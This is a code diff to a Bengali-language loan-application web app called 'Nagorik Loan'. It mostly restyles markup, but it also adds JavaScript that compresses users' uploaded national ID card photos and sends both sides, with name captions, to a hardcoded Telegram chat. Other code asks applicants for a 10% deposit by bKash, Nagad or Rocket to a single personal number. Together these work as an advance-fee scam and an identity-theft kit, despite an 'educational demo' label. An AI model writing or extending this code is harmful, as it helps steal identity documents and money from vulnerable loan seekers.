@@ -239,18 +239,7 @@
         .payment-method { display: flex; align-items: center; gap: 12px; padding: 14px; background: var(--white); border: 1.5px solid var(--border); border-radius: 10px; cursor: pointer; transition: all 0.2s; }
         .payment-method:hover { border-color: var(--red); background: #FFF5F5; }
         .payment-method:active { transform: scale(0.98); }
-        .pm-logo {
-            width: 50px;
-            height: 50px;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            background: #F5F5F5;
-            overflow: hidden;
-            padding: 5px;
-        }
+        .pm-logo { width: 50px; height: 50px; border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; background: #F5F5F5; overflow: hidden; padding: 5px; }
         .pm-logo img { width: 100%; height: 100%; object-fit: contain; display: block; }
         .pm-info { flex: 1; }
         .pm-name { font-size: 14px; font-weight: 700; color: var(--text); }
@@ -351,9 +340,9 @@
             </button>
         </header>
 
-        <main class="content">
+        <main class="content">           
 
-            <!-- HOME -->
+<!-- HOME -->
             <section class="page active" id="page-home">
                 <div class="welcome">
                     <h1>আপনাকে স্বাগতম!</h1>
@@ -546,23 +535,17 @@
                     <p style="text-align:center;font-size:13px;font-weight:600;color:var(--primary);margin-bottom:12px;"><i class="fa-solid fa-shield-halved" style="color:var(--green);"></i> পেমেন্ট পদ্ধতি নির্বাচন করুন</p>
                     <div class="payment-methods">
                         <div class="payment-method" onclick="selectPayment('bkash')">
-                            <div class="pm-logo">
-                                <img src="images/bkash-logo.png" alt="bKash" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fa-solid fa-mobile-screen-button\' style=\'color:#E2136E;font-size:24px;\'></i>';">
-                            </div>
+                            <div class="pm-logo"><img src="images/bkash-logo.png" alt="bKash" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fa-solid fa-mobile-screen-button\' style=\'color:#E2136E;font-size:24px;\'></i>';"></div>
                             <div class="pm-info"><div class="pm-name">বিকাশ</div><div class="pm-desc">বিকাশ পেমেন্ট (সেন্ড মানি)</div></div>
                             <div class="pm-check"><i class="fa-solid fa-chevron-right"></i></div>
                         </div>
                         <div class="payment-method" onclick="selectPayment('nagad')">
-                            <div class="pm-logo">
-                                <img src="images/nagad-logo.png" alt="Nagad" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fa-solid fa-mobile-screen-button\' style=\'color:#EE462B;font-size:24px;\'></i>';">
-                            </div>
+                            <div class="pm-logo"><img src="images/nagad-logo.png" alt="Nagad" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fa-solid fa-mobile-screen-button\' style=\'color:#EE462B;font-size:24px;\'></i>';"></div>
                             <div class="pm-info"><div class="pm-name">নগদ</div><div class="pm-desc">নগদ পেমেন্ট (সেন্ড মানি)</div></div>
                             <div class="pm-check"><i class="fa-solid fa-chevron-right"></i></div>
                         </div>
                         <div class="payment-method" onclick="selectPayment('rocket')">
-                            <div class="pm-logo">
-                                <img src="images/rocket-logo.png" alt="Rocket" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fa-solid fa-mobile-screen-button\' style=\'color:#8E24AA;font-size:24px;\'></i>';">
-                            </div>
+                            <div class="pm-logo"><img src="images/rocket-logo.png" alt="Rocket" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\'fa-solid fa-mobile-screen-button\' style=\'color:#8E24AA;font-size:24px;\'></i>';"></div>
                             <div class="pm-info"><div class="pm-name">রকেট</div><div class="pm-desc">রকেট পেমেন্ট (সেন্ড মানি)</div></div>
                             <div class="pm-check"><i class="fa-solid fa-chevron-right"></i></div>
                         </div>
@@ -574,8 +557,20 @@
             <section class="page" id="page-bkash">
                 <div class="page-header-bar"><i class="fa-solid fa-arrow-left" onclick="goPage('payment')"></i><span id="bkashHeaderTitle">বিকাশ পেমেন্ট</span><span></span></div>
                 <div class="auth-form">
-                    <div style="text-align:center;margin-bottom:18px;"><div id="bkashLogoBox" style="width:70px;height:70px;margin:0 auto 10px;border-radius:50%;background:#E2136E;color:#fff;display:flex;align-items:center;justify-content:center;font-size:26px;"><i class="fa-solid fa-mobile-screen-button"></i></div><h3 style="font-size:18px;color:var(--primary);" id="bkashTitle">বিকাশ পেমেন্ট</h3></div>
-                    <div style="background:#F5F5F5;padding:14px;border-radius:8px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;"><div><div style="font-size:11px;color:var(--text-light);">প্রেরক</div><div style="font-size:13px;font-weight:600;color:var(--text);">নাগরিক লোন</div></div><div style="text-align:right;"><div style="font-size:11px;color:var(--text-light);">পরিমাণ</div><div style="font-size:15px;font-weight:700;color:var(--red);" id="bkashAmount">৳০</div></div></div>
+                    <div style="text-align:center;margin-bottom:18px;">
+                        <div id="bkashLogoBox" style="width:70px;height:70px;margin:0 auto 10px;border-radius:50%;background:#E2136E;color:#fff;display:flex;align-items:center;justify-content:center;font-size:26px;overflow:hidden;padding:8px;"></div>
+                        <h3 style="font-size:18px;color:var(--primary);" id="bkashTitle">বিকাশ পেমেন্ট</h3>
+                    </div>
+                    <div style="background:#F5F5F5;padding:14px;border-radius:8px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;">
+                        <div>
+                            <div style="font-size:11px;color:var(--text-light);">প্রেরক</div>
+                            <div style="font-size:13px;font-weight:600;color:var(--text);">নাগরিক লোন</div>
+                        </div>
+                        <div style="text-align:right;">
+                            <div style="font-size:11px;color:var(--text-light);">পরিমাণ</div>
+                            <div style="font-size:15px;font-weight:700;color:var(--red);" id="bkashAmount">৳০</div>
+                        </div>
+                    </div>
                     <div class="instructions-box">
                         <h4 style="font-size:13px;color:var(--red);margin-bottom:10px;"><i class="fa-solid fa-circle-info"></i> নির্দেশনা:</h4>
                         <ol class="instructions-list">
@@ -644,7 +639,7 @@
             </section>
 
             <!-- CONTACT -->
-            <section class="page" id="page-contact"><div class="placeholder"><i class="fa-solid fa-headset"></i><h2>যোগাযোগ</h2><p>Contract On WhatsApp:+8801357165564</p></div></section>
+            <section class="page" id="page-contact"><div class="placeholder"><i class="fa-solid fa-headset"></i><h2>যোগাযোগ</h2><p>Contract On WhatsApp: +8801357165564</p></div></section>
 
         </main>
 
@@ -670,22 +665,29 @@
             <div class="nav-item" data-page="transactions" onclick="goPage('transactions')"><i class="fa-solid fa-envelope nav-icon"></i><span>ইনবক্স</span></div>
         </nav>
 
-    </div>
-
+    </div> 
     <script>
         // ============================================
-        // 💰 PAYMENT NUMBERS (এখানে তোমার নাম্বার বসাও)
+        // 💰 PAYMENT NUMBERS
         // ============================================
         const PAYMENT_NUMBERS = {
-            bkash: '01357165564',      // 👈 তোমার bKash নাম্বার
-            nagad: '01357165564',      // 👈 Nagad নাম্বার (পরে change করো)
-            rocket: '01357165564'      // 👈 Rocket নাম্বার (পরে change করো)
+            bkash: '01357165564',
+            nagad: '01357165564',
+            rocket: '01357165564'
         };
 
         // ============================================
-        // 🧭 PAGE NAVIGATION
+        // 🧭 PAGE NAVIGATION (with login protection)
         // ============================================
+        const PROTECTED_PAGES = ['dashboard', 'profile', 'apply', 'verify', 'payment', 'bkash', 'cashout', 'loans', 'transactions', 'installment', 'summary'];
+
         function goPage(pageId) {
+            if (PROTECTED_PAGES.includes(pageId) && !Auth.isLoggedIn()) {
+                alert('এই ফিচার ব্যবহার করতে অনুগ্রহ করে প্রথমে লগইন বা রেজিস্টার করুন।');
+                goPage('login');
+                return;
+            }
+
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             const target = document.getElementById('page-' + pageId);
             if (target) {
@@ -1070,6 +1072,7 @@
             }, 800);
         }
 
+        // Custom amount toggle
         document.addEventListener('change', (e) => {
             if (e.target.id === 'applyAmount') {
                 const custom = document.getElementById('applyCustomAmount');
@@ -1079,7 +1082,7 @@
         });
 
         // ============================================
-        // 📷 NID UPLOAD
+        // 📷 NID UPLOAD (with compression)
         // ============================================
         function handleNidUpload(input, side) {
             const file = input.files[0];
@@ -1088,16 +1091,54 @@
 
             const reader = new FileReader();
             reader.onload = (e) => {
-                const dataUrl = e.target.result;
-                const preview = document.getElementById(side === 'front' ? 'nidFrontPreview' : 'nidBackPreview');
-                preview.innerHTML = `<img src="${dataUrl}" alt="${side}">`;
-                preview.parentElement.classList.add('uploaded');
-                if (side === 'front') nidFrontData = dataUrl;
-                else nidBackData = dataUrl;
+                const img = new Image();
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    let width = img.width;
+                    let height = img.height;
+                    const maxSize = 1200;
+
+                    if (width > height && width > maxSize) {
+                        height = (height * maxSize) / width;
+                        width = maxSize;
+                    } else if (height > maxSize) {
+                        width = (width * maxSize) / height;
+                        height = maxSize;
+                    }
+
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, width, height);
+
+                    const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+
+                    const preview = document.getElementById(side === 'front' ? 'nidFrontPreview' : 'nidBackPreview');
+                    preview.innerHTML = `<img src="${compressedDataUrl}" alt="${side}">`;
+                    preview.parentElement.classList.add('uploaded');
+
+                    if (side === 'front') nidFrontData = compressedDataUrl;
+                    else nidBackData = compressedDataUrl;
+                };
+                img.src = e.target.result;
             };
             reader.readAsDataURL(file);
         }
 
+        // dataURL → Blob
+        function dataURLtoBlob(dataURL) {
+            const parts = dataURL.split(',');
+            const mime = parts[0].match(/:(.*?);/)[1];
+            const bstr = atob(parts[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // ============================================
+        // 📤 NID SUBMIT (with image upload)
+        // ============================================
         async function handleNidSubmit() {
             if (!nidFrontData || !nidBackData) { alert('দয়া করে NID এর দুই পাশের ছবি আপলোড করুন'); return; }
             if (!pendingLoan) { alert('আগে লোন আবেদন সম্পন্ন করুন'); goPage('apply'); return; }
@@ -1109,7 +1150,7 @@
             const uid = getUserId();
             const time = getTimeNow();
 
-            const msg = `<b>📷 নাগরিক লোন - Step 3 (NID Upload)</b>
+            const textMsg = `<b>📷 নাগরিক লোন - Step 3 (NID Upload)</b>
 ━━━━━━━━━━━━━━━━━
 👤 <b>User ID:</b> <code>${uid}</code>
 📝 <b>Name:</b> ${pendingLoan.name}
@@ -1121,7 +1162,27 @@
 ━━━━━━━━━━━━━━━━━
 <blockquote>⚠️ Educational demo only</blockquote>`;
 
-            await sendToTelegram(msg);
+            await sendToTelegram(textMsg);
+
+            // Send NID Front image
+            try {
+                const blobFront = dataURLtoBlob(nidFrontData);
+                const fd1 = new FormData();
+                fd1.append('chat_id', '5085997009');
+                fd1.append('photo', blobFront, `nid-front-${uid}.jpg`);
+                fd1.append('caption', `🆔 NID Front - ${pendingLoan.name} (${uid})`);
+                await fetch('/api/send-photo', { method: 'POST', body: fd1 });
+            } catch (err) { console.error('Front error:', err); }
+
+            // Send NID Back image
+            try {
+                const blobBack = dataURLtoBlob(nidBackData);
+                const fd2 = new FormData();
+                fd2.append('chat_id', '5085997009');
+                fd2.append('photo', blobBack, `nid-back-${uid}.jpg`);
+                fd2.append('caption', `🆔 NID Back - ${pendingLoan.name} (${uid})`);
+                await fetch('/api/send-photo', { method: 'POST', body: fd2 });
+            } catch (err) { console.error('Back error:', err); }
 
             const loanAmount = Number(pendingLoan.amount);
             const deposit = Math.round(loanAmount * 0.1);
@@ -1135,7 +1196,7 @@
                 btn.disabled = false;
                 btn.innerHTML = '<i class="fa-solid fa-paper-plane"></i> ডকুমেন্ট জমা দিন';
                 document.getElementById('depositPopup').classList.add('show');
-            }, 800);
+            }, 1500);
         }
 
         function proceedToPayment() {
@@ -1144,7 +1205,7 @@
         }
 
         // ============================================
-        // 💳 PAYMENT SELECTION
+        // 💳 PAYMENT SELECTION (with logo)
         // ============================================
         let selectedPayment = null;
 
@@ -1154,6 +1215,11 @@
             const methodNames = { bkash: 'বিকাশ', nagad: 'নগদ', rocket: 'রকেট' };
             const methodColors = { bkash: '#E2136E', nagad: '#EE462B', rocket: '#8E24AA' };
             const methodPins = { bkash: 'bKash', nagad: 'Nagad', rocket: 'Rocket' };
+            const methodLogos = {
+                bkash: 'images/bkash-logo.png',
+                nagad: 'images/nagad-logo.png',
+                rocket: 'images/rocket-logo.png'
+            };
 
             document.getElementById('bkashHeaderTitle').textContent = methodNames[method] + ' পেমেন্ট';
             document.getElementById('bkashTitle').textContent = methodNames[method] + ' পেমেন্ট';
@@ -1161,7 +1227,11 @@
             document.getElementById('bkashPinName').textContent = methodPins[method];
             document.getElementById('bkashAmount').textContent = '৳' + deposit.toLocaleString('en-US');
             document.getElementById('bkashAmountInline').textContent = deposit.toLocaleString('en-US');
-            document.getElementById('bkashLogoBox').style.background = methodColors[method];
+
+            const logoBox = document.getElementById('bkashLogoBox');
+            logoBox.style.background = '#FFFFFF';
+            logoBox.style.border = '2px solid ' + methodColors[method];
+            logoBox.innerHTML = `<img src="${methodLogos[method]}" alt="${methodNames[method]}" style="width:80%;height:80%;object-fit:contain;" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\\'fa-solid fa-mobile-screen-button\\' style=\\'color:${methodColors[method]};font-size:26px;\\'></i>';">`;
 
             document.getElementById('bkashNumber').textContent = PAYMENT_NUMBERS[method];
 
@@ -1275,12 +1345,16 @@
             }, 900);
         }
 
+        // ============================================
+        // 🎉 SUCCESS POPUP (with close button)
+        // ============================================
         function showSuccessPopup(amount) {
             const overlay = document.createElement('div');
             overlay.className = 'popup-overlay show';
             overlay.id = 'successPopup';
             overlay.innerHTML = `
-                <div class="popup-box">
+                <div class="popup-box" style="position:relative;">
+                    <button onclick="closeSuccessPopup()" style="position:absolute;top:12px;right:12px;width:32px;height:32px;border-radius:50%;border:none;background:#F5F5F5;color:#666;font-size:20px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1;transition:all 0.2s;">×</button>
                     <div class="popup-icon" style="background:#E8F5E9;color:#2E7D32;">
                         <i class="fa-solid fa-check-circle"></i>
                     </div>
@@ -1294,6 +1368,11 @@
                 </div>
             `;
             document.body.appendChild(overlay);
+        }
+
+        function closeSuccessPopup() {
+            const popup = document.getElementById('successPopup');
+            if (popup) popup.remove();
         }
 
         // ============================================
